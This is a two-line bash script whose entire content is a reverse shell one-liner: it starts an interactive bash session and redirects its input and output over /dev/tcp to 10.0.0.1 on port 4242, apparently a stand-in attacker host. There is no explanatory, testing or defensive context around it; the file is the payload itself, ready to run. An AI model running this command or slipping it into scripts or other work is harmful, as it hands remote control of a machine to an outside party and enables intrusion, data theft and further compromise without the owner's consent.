#!/bin/bash
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
